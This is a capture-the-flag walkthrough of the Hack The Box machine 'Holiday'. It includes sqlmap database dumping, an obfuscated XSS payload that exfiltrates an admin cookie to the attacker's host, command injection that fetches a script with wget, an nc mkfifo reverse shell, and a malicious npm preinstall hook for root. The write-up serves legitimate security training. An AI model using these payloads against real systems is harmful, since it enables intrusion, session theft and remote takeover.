![logo](/logo.png)

# [Holiday- BOX]  
Hi folks, today I am going to solve an Hard rated hack the box machine which was released on 02 Jun 2017  as the 17th machine on HTB,Holiday created by [g0blin](https://app.hackthebox.com/users/343) without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *http
  *ssh
  
  
###### code-nmap

```code
nmap -sV -sC -oA nmap/holiday 10.10.10.25
```

###### Output 

![](/Linux/Linux-Hard/Holiday/Screenshots/nmap.png)

```sh
 nmap -sV -sC -oA nmap/holiday 10.10.10.25                                                                                         ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-21 18:43 EAT
Nmap scan report for 10.10.10.25
Host is up (0.36s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c3:aa:3d:bd:0e:01:46:c9:6b:46:73:f3:d1:ba:ce:f2 (RSA)
|   256 b5:67:f5:eb:8d:11:e9:0f:dd:f4:52:25:9f:b1:2f:23 (ECDSA)
|_  256 79:e9:78:96:c5:a8:f4:02:83:90:58:3f:e5:8d:fa:98 (ED25519)
6699/tcp filtered napster
8000/tcp open     http    Node.js Express framework
|_http-title: Error
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 152.20 seconds
```

looking at the results  we find out that there are 3 ports open and its a `Ubuntu`and its running an `Node.js`. 

port[22]-ssh
port[8000]-http
port[6699]- napster

when we naviagate to [http://10.10.10.25:8000](http://10.10.10.25:8000)  we find a page with seem to be a website for a booking management.

![](/Linux/Linux-Hard/Holiday/Screenshots/book.png)

now we dont see anything interesting so lets enumerate directories  to find out what else is available. Make sure the user Agent has `Linux`

```sh
gobuster dir --url http://10.10.10.25:8000 --wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -k -a "Linux"
```

![](/Linux/Linux-Hard/Holiday/Screenshots/userAgent.png)

we see a login page 

![](/Linux/Linux-Hard/Holiday/Screenshots/login.png)

so lets start burpsuite and take the request so that we can do a an sqlmap to enumerate the login

```sh
sqlmap -r sqlmapholiday.req --level=5 --risk=3 --dump-all
```


![](/Linux/Linux-Hard/Holiday/Screenshots/sqlmap.png)

The hash can be easily looked up online. In this case, [crackstation ](https://crackstation.net/) will find the hash. the hash `fdc8cd4cff2c19e0d1022e78481ddf36`

![](/Linux/Linux-Hard/Holiday/Screenshots/crackstation.png)

now we log into the website 

![](/Linux/Linux-Hard/Holiday/Screenshots/loggedin.png)

when you click on one of the `UUID` it shows setails and their is a `notes` tab 

![](/Linux/Linux-Hard/Holiday/Screenshots/notes.png)

It’s interesting to see the note that all notes must be approved, and that it can take up to a minute. This implies some kind of user interaction, probably once a minute.

# Exploitation

### XSS

ll new notes added to a booking are reviewed approximately every one minute by a user with
admin privileges. There are several filter in place to prevent XSS and successful exploitation can
be tricky for some. The most reliable method seems to be using a malformed <img> tag
combined with eval(String.fromCharCode(...))
Example: `<img src="x/><script>eval(String.fromCharCode(CHARCODE_HERE));</script>">`

now i use this payload to ensure that `js`  i created as payload will run

```sh
var url = "http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65";
$.ajax({method: "GET", url: url,success: function(data)
{$.post("http://10.10.14.15:81/", data);}});
```

so we set a listenning on port 81 and a python server so as send the payload but first we have to converte what we would upload in the notes as a decimal with this.

```sh
ayload = '''document.write('<script src="http://10.10.14.15/holiday.js"></script>');'''

','.join([str(ord(c)) for c in payload])
```

![](/Linux/Linux-Hard/Holiday/Screenshots/decimal.png)

This is what we add in the notes so that it can execute the `js` and give us cookies of high privillage user.

```sh
<img src="/><script>eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,49,48,46,49,48,46,49,52,46,49,53,58,56,48,48,48,47,104,111,108,105,100,97,121,46,106,115,34,62,60,47,115,99,114,105,112,116,62,39,41,59))</script>" />
```

![](/Linux/Linux-Hard/Holiday/Screenshots/payload.png)

you can see it hit the http.server 

![](/Linux/Linux-Hard/Holiday/Screenshots/http.png)

then we can see we get a cookie

![](/Linux/Linux-Hard/Holiday/Screenshots/cookie.png)

now lets go to the browser then we can set the cookies so that we can refresh it.

![](/Linux/Linux-Hard/Holiday/Screenshots/cookieeditor.png)

Then we can see the admin navigation added.

![](/Linux/Linux-Hard/Holiday/Screenshots/adminnavigation.png)

![](/Linux/Linux-Hard/Holiday/Screenshots/admin.png)
Once access to the administrator account is obtained, it is possible to view the /admin page. On
the page there is a link to export a specified table. 

![](/Linux/Linux-Hard/Holiday/Screenshots/adminside.png)

so when we try to export the notes it get exported so what we do it to go and start burpsuite so that we can be able to intercept the request.

![](/Linux/Linux-Hard/Holiday/Screenshots/burpsuite.png)

we send it to repeater for further analysis.It is possible to escape the table name and
inject system commands, however there are fairly tight restrictions on characters that can be
used for the table name. Starting the table name with `%2f%26` allows for nearly unrestricted
command injection.

![](/Linux/Linux-Hard/Holiday/Screenshots/whoami.png)

now what we do is lets us create a reverse shell then use wget to get so that we can be able to get the reverse shell executed.

```sh
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 9001 >/tmp/f
```

so lets also code our IP to Hexadecimal using [cyberchef](https://gchq.github.io/CyberChef/#recipe=Change_IP_format('Dotted%20Decimal','Hex')&input=MTAuMTAuMTQuMTU) remeber to add the `x`

to be `0xa0a0e0f`

![](/Linux/Linux-Hard/Holiday/Screenshots/cyberchef.png)

but first lets set a listerner

```sh
python -m http.server 80 
```

![](/Linux/Linux-Hard/Holiday/Screenshots/httpserver.png)

```sh
wget+0xa0a0e0f/shell
```

![](/Linux/Linux-Hard/Holiday/Screenshots/burpshell1.png)


just like that and we get shell

![](/Linux/Linux-Hard/Holiday/Screenshots/shell.png)

## Takeover
 After geting the reverse shell we have to do some adjusment to our reverse shell to make it ready for using by doing a stty escalation to get an interactive shell:
#### code-stty
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 [ctrl] + z
 stty raw -echo ; fg
 ```

```sh
export TERM=screen-256color
export SHELL=bash
stty rows 29 cols 135
reset
```

![](/Linux/Linux-Hard/Holiday/Screenshots/takeover.png)

you can get user flag here

![](/Linux/Linux-Hard/Holiday/Screenshots/userflag.png)

# Privillage Escalation 

running `sudo -l` show the that you can run the `/usr/bin/npm i *`  

so we create an `index.js` in `/dev/shm` so that when the machine is rebooted it will delete the files from here and a directory in it as `privsec`

```sh
module.exports = "dangerous npm install";
```

next we edit the shell earlier that we got to the box to change it to listen at port `9002` then we create a `payload.json`  so that we can upload a payload

```sh
{
  "name": "rimrafall",
  "version": "1.0.0",
  "description": "Executes a reverse shell",
  "main": "index.js",
  "scripts": {
    "preinstall": "bash ~/app/shell"
  },
  "keywords": [
    "rimraf",
    "rmrf"
  ],
  "author": "João Jerónimo",
  "license": "ISC"
}
```

```sh
sudo /usr/bin/npm i privesc/ --unsafe
```

![](/Linux/Linux-Hard/Holiday/Screenshots/sudol.png)

just like that and we get the root shell

![](/Linux/Linux-Hard/Holiday/Screenshots/root.png)

so then we can get the root flag

![](/Linux/Linux-Hard/Holiday/Screenshots/rootflag.png)

	-------------------------END successful attack @lesley------------